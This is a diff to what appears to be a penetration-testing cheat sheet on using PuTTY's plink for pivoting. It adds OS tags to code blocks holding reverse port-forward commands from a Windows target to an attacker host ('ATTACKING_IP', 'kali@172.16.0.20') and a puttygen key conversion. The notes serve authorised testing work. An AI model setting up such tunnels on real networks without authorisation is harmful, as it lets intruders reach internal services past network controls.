@@ -6,6 +6,7 @@ PuTTY's command-line SSH client. Useful on Windows targets that lack OpenSSH but
 
 ### Reverse port forward from Windows
 
+<!-- cmd: windows -->
 ```cmd
 cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
 ```
@@ -16,6 +17,7 @@ documented as a Windows reverse-forwarding fallback when a target can egress to 
 
 Example:
 
+<!-- cmd: windows -->
 ```cmd
 cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
 ```
@@ -24,6 +26,7 @@ cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFI
 
 ### Convert OpenSSH keys to PuTTY format
 
+<!-- cmd: linux -->
 ```bash
 sudo apt install putty-tools
 puttygen KEYFILE -o OUTPUT_KEY.ppk
